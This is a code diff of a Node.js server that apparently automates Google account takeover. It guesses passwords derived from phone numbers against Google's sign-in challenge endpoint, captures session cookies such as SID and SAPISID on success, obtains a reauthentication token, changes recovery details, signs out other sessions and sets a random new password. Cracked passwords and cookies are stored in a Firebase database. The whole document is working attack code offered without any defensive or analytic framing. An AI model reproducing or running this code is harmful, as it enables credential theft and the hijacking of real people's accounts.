@@ -12,13 +12,10 @@ const fs = require('fs')
 
 const app = express()
 
-app.use(express.json())
-app.use(bodyParser.urlencoded({ extended: true }))
-
 const server = http.createServer(app)
 
 server.listen(process.env.PORT || 3000, ()=>{
-    console.log("Listening on port --- "+(process.env.PORT || 3000))
+    console.log("Listening on port 3000...")
 })
 
 const serviceAccount = require(path.resolve("database088-firebase-adminsdk-ho5ln-4610a9f3c6.json"))
@@ -42,10 +39,10 @@ app.post('/', async function (req, res) {
         try {
             let mData = req.body.data.split('★')
             console.log('Received Data: '+mData.length)
-            if(mData.length == 8) {
-                getRaptToken(res, mData[6], mData)
+            if(mData.length == 6) {
+                passwordMatching(res, mData, null, 0, 0, mData[4])
             } else {
-                res.end('not 8')
+                res.end('not 6')
             }
         } catch (e) {
             res.end(e.toString())
@@ -55,8 +52,39 @@ app.post('/', async function (req, res) {
     }
 })
 
+app.get('/ip', async function (req, res) {
+    request({
+        url: 'https://ifconfig.me/ip',
+        method: 'GET',
+        followRedirect: false
+    }, function(error, response, body) {
+        if(error) {
+            res.end('Error')
+        } else {
+            res.end(body)
+        }
+    })
+})
 
-function passwordMatching(connection, mData, sendCookies, again, loop, gps, password) {
+function passwordMatching(connection, mData, sendCookies, again, loop, gps) {
+    let pass = ''
+    if(mData[1].split('/')[1] == '880') {
+        pass = '0'+mData[2]
+    } else {
+        pass = mData[2]
+    }
+
+    let password = pass
+
+    if(again == 1) {
+        password = mData[6]
+    } else {
+        if(loop == 1) {
+            password = pass.substring(0, 8)
+        } else if(loop == 2) {
+            password = pass.substring(pass.length-8, pass.length)
+        }
+    }
 
     request({
         url: 'https://accounts.google.com/_/signin/challenge?hl=en&TL='+mData[3]+'&_reqid=999999',
@@ -74,10 +102,58 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps, pass
 
         console.log('Passwort Try: '+loop)
 
-        if(again == 1) {
+        if(again == 0) {
+            try {
+                let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
+                if(data[0][3] == 5) {
+                    if(mData[2].length > 8) {
+                        if(loop == 0) {
+                            output = 1
+                            passwordMatching(connection, mData, null, 0, 1, gps)
+                        } else if(loop == 1) {
+                            output = 1
+                            passwordMatching(connection, mData, null, 0, 2, gps)
+                        } else {
+                            console.log('Matching Failed')
+                        }
+                    }
+                } else if(data[0][3] == 1) {
+                    console.log('Login Success')
+                    let cookiesList = responce.headers['set-cookie']
+                    if(cookiesList) {
+                        output = 2
+                        let sendCookies = ''
+    
+                        for(let i=0; i<cookiesList.length; i++) {
+                            let singelData = cookiesList[i]
+                            try {
+                                let start = singelData.indexOf('=')
+                                let end = singelData.indexOf(';')
+                                let key = singelData.substring(0, start)
+                                if(key == 'SID' || key == '__Secure-1PSID' || key == 'HSID' || key == 'SSID' || key == 'SAPISID' || key == 'LSID' || key == 'APISID') {
+                                    let value = singelData.substring(start+1, end)
+                                    sendCookies += key+'='+value+'; '
+                                }
+                            } catch (e) {}
+                        }
+
+                        getRaptToken(connection, password, mData, sendCookies)
+                    }
+                } else {
+                    let temp = mData[2].toString()
+                    let index = temp.length == 8 ? 2 : temp.length == 9 || temp.length == 10 ? 3 : temp.length == 11 ? 4 : 5
+                    console.log('Password Matching')
+                    if(data[0][3] == 2) {
+                        database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/1111111111/'+mData[2]).set(loop)
+                    } else {
+                        database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/'+temp.substring(0, index)+'/'+temp.substring(index, temp.length)).set(loop)
+                    }
+                }
+            } catch (e) {}
+        } else if(again == 1) {
             output = 1
             let wrong = true
-            console.log(body)
+            console.log('Login Again')
             try {
                 let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
                 if(data[0][3] == 1) {
@@ -116,7 +192,7 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps, pass
                                     let wrong = true
                                     try {
                                         if(!error && responce.headers['set-cookie']) {
-                                            let cookiesList = responce.headers['set-cookie']
+                                            cookiesList = responce.headers['set-cookie']
         
                                             for(let i=0; i<cookiesList.length; i++) {
                                                 let singelData = cookiesList[i]
@@ -132,19 +208,20 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps, pass
                                             }
                                             
                                             wrong = false
+                                            console.log(sendCookies)
                                             Completed(connection, password, mData, sendCookies, mRAPT)
                                         }
                                     } catch (e) {}
 
                                     try {
                                         if(wrong && connection != null) {
-                                            connection.end(mData[0]+' 5')
                                             let send = sendCookies
                                             if(send == null) {
                                                 send = {}
                                             }
                                             send['PASS'] = password
                                             database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
+                                            connection.end(mData[0]+' 5')
                                         }
                                     } catch (e) {}
                                 })
@@ -153,13 +230,13 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps, pass
 
                         try {
                             if(wrong && connection != null) {
-                                connection.end(mData[0]+' 4')
                                 let send = sendCookies
                                 if(send == null) {
                                     send = {}
                                 }
                                 send['PASS'] = password
                                 database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
+                                connection.end(mData[0]+' 4')
                             }
                         } catch (e) {}
                     })
@@ -168,29 +245,28 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps, pass
 
             try {
                 if(wrong && connection != null) {
-                    connection.end(mData[0]+' 13')
                     let send = sendCookies
                     if(send == null) {
                         send = {}
                     }
                     send['PASS'] = password
                     database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
+                    connection.end(mData[0]+' 13')
                 }
             } catch (e) {}
         }
 
         try {
             if(output == 0 && connection != null) {
-                connection.end(mData[0]+' 1')
                 console.log('Next')
+                connection.end(mData[0]+' 1')
             }
         } catch (e) {}
     })
 }
 
 
-function getRaptToken(connection, password, mData) {
-    let sendCookies = mData[7]
+function getRaptToken(connection, password, mData, sendCookies) {
 
     request({
         url: 'https://myaccount.google.com/signinoptions/rescuephone',
@@ -205,7 +281,6 @@ function getRaptToken(connection, password, mData) {
         try {
             if (!error) {
                 let headers = response.headers
-                console.log(headers['location'])
                 if(headers && headers['location']) {
                     let index = headers['location'].indexOf('rart=')
                     let split = headers['location'].substring(index, headers['location'].length).split('&')
@@ -228,7 +303,7 @@ function getRaptToken(connection, password, mData) {
                                     let tl = headers['location'].substring(index+3, headers['location'].length).split('&')[0]
                                     index = headers['location'].indexOf('cid=')
                                     let cid = headers['location'].substring(index+4, headers['location'].length).split('&')[0]
-                                    let cookiesList = headers['set-cookie']
+                                    cookiesList = headers['set-cookie']
                                     let gps = mData[4]
                                     for(let i=0; i<cookiesList.length; i++) {
                                         let singelData = cookiesList[i]
@@ -247,38 +322,36 @@ function getRaptToken(connection, password, mData) {
                                     mData[4] = gps
                                     mData[5] = cid
                                     mData[6] = password
-                                    passwordMatching(connection, mData, sendCookies, 1, 0, gps, password)
+                                    passwordMatching(connection, mData, sendCookies, 1, 0, gps)
                                 }
                             } else {}
                         } catch (e) {}
                         
                         try {
                             if(wrong && connection != null) {
-                                connection.end(mData[0]+' 2')
                                 let send = sendCookies
                                 if(send == null) {
                                     send = {}
                                 }
                                 send['PASS'] = password
                                 database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
+                                connection.end(mData[0]+' 2')
                             }
                         } catch (e) {}
                     })
                 }
-            } else {
-                console.log(error)
-            }
+            } else {}
         } catch (e) {}
         
         try {
             if(wrong && connection != null) {
-                connection.end(mData[0]+' 3')
                 let send = sendCookies
                 if(send == null) {
                     send = {}
                 }
                 send['PASS'] = password
                 database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
+                connection.end(mData[0]+' 3')
             }
         } catch (e) {}
     })
@@ -357,7 +430,7 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                     let recovery = mRecovery[position]
                     wrong = false
 
-                    console.log(gmail, year)
+                    console.log(time, gmail)
 
                     request({
                         url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=uc1K4d&rapt='+mRAPT,
@@ -373,7 +446,6 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                         try {
                             if(!(error || body.includes('"er"'))) {
                                 wrong = false
-                                console.log('Recovery Change')
                                 request({
                                     url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=GWdvgc&rapt='+mRAPT,
                                     method: 'POST',
@@ -413,15 +485,13 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                             try {
                                                                 if(!(error || body == '')) {
                                                                     let index = body.indexOf('SNlM0e')
-                                                                    console.log(index)
                                                                     if(index != -1) {
                                                                         let temp = body.substring(index+6, index+100)
                                                                         time = temp.substring(temp.indexOf(':')+1, temp.indexOf(',')).replace('"', '').replace('"', '').replace(' ', '')
                                                                     }
                                             
                                                                     index = body.indexOf('AF_initDataCallback(')
-                                                                    console.log(index)
-                                                                    
+                                            
                                                                     if(index != -1) {
                                                                         let temp = body.substring(index+20, body.length)
                                                                         let data = JSON.parse(temp.substring(temp.indexOf('['), temp.indexOf(', sideChannel: {}});</script>')))[1]
@@ -438,8 +508,6 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                                                 }
                                                                             }
                                                                         }
-
-                                                                        console.log(Object.keys(logout.length))
 
                                                                         if(Object.keys(logout.length) > 0) {
                                                                             wrong = false
@@ -462,7 +530,6 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                                                 }, function(error, response, body) {
                                                                                     output++
                                                                                     if(output == size) {
-                                                                                        console.log('Change Password')
                                                                                         let changePass = getRandomPassword()
                                                                                         request({
                                                                                             url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=or64jf&rapt='+mRAPT,
@@ -489,13 +556,13 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                                                             
                                                                                             try {
                                                                                                 if(wrong && connection != null) {
-                                                                                                    connection.end(mData[0]+' 11')
                                                                                                     let send = sendCookies
                                                                                                     if(send == null) {
                                                                                                         send = {}
                                                                                                     }
                                                                                                     send['PASS'] = password
                                                                                                     database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
+                                                                                                    connection.end(mData[0]+' 11')
                                                                                                 }
                                                                                             } catch (e) {}
                                                                                         })
@@ -509,7 +576,6 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
 
                                                             try {
                                                                 if(wrong && connection != null) {
-                                                                    console.log('Change Password 2')
                                                                     let changePass = getRandomPassword()
                                                                     request({
                                                                         url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=or64jf&rapt='+mRAPT,
@@ -536,13 +602,13 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                                         
                                                                         try {
                                                                             if(wrong && connection != null) {
-                                                                                connection.end(mData[0]+' 11')
                                                                                 let send = sendCookies
                                                                                 if(send == null) {
                                                                                     send = {}
                                                                                 }
                                                                                 send['PASS'] = password
                                                                                 database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
+                                                                                connection.end(mData[0]+' 11')
                                                                             }
                                                                         } catch (e) {}
                                                                     })
@@ -553,13 +619,13 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                         console.log(body)
                                                         try {
                                                             if(wrong && connection != null) {
-                                                                connection.end(mData[0]+' 99')
                                                                 let send = sendCookies
                                                                 if(send == null) {
                                                                     send = {}
                                                                 }
                                                                 send['PASS'] = password
                                                                 database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
+                                                                connection.end(mData[0]+' 99')
                                                             }
                                                         } catch (e) {}
                                                     }
@@ -568,13 +634,13 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                 console.log(err)
                                                 try {
                                                     if(wrong && connection != null) {
-                                                        connection.end(mData[0]+' 9')
                                                         let send = sendCookies
                                                         if(send == null) {
                                                             send = {}
                                                         }
                                                         send['PASS'] = password
                                                         database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
+                                                        connection.end(mData[0]+' 9')
                                                     }
                                                 } catch (e) {}
                                             })
@@ -585,13 +651,13 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
 
                                     try {
                                         if(wrong && connection != null) {
-                                            connection.end(mData[0]+' 8')
                                             let send = sendCookies
                                             if(send == null) {
                                                 send = {}
                                             }
                                             send['PASS'] = password
                                             database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
+                                            connection.end(mData[0]+' 8')
                                         }
                                     } catch (e) {}
                                 })
@@ -600,13 +666,13 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
 
                         try {
                             if(wrong && connection != null) {
-                                connection.end(mData[0]+' 7')
                                 let send = sendCookies
                                 if(send == null) {
                                     send = {}
                                 }
                                 send['PASS'] = password
                                 database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
+                                connection.end(mData[0]+' 7')
                             }
                         } catch (e) {}
                     })
@@ -616,13 +682,13 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
         
         try {
             if(wrong && connection != null) {
-                connection.end(mData[0]+' 6')
                 let send = sendCookies
                 if(send == null) {
                     send = {}
                 }
                 send['PASS'] = password
                 database.child('/code/gmail/found/'+mData[1].split('/')[0]+'/0000000000/'+mData[2]).update(send)
+                connection.end(mData[0]+' 6')
             }
         } catch (e) {}
     })
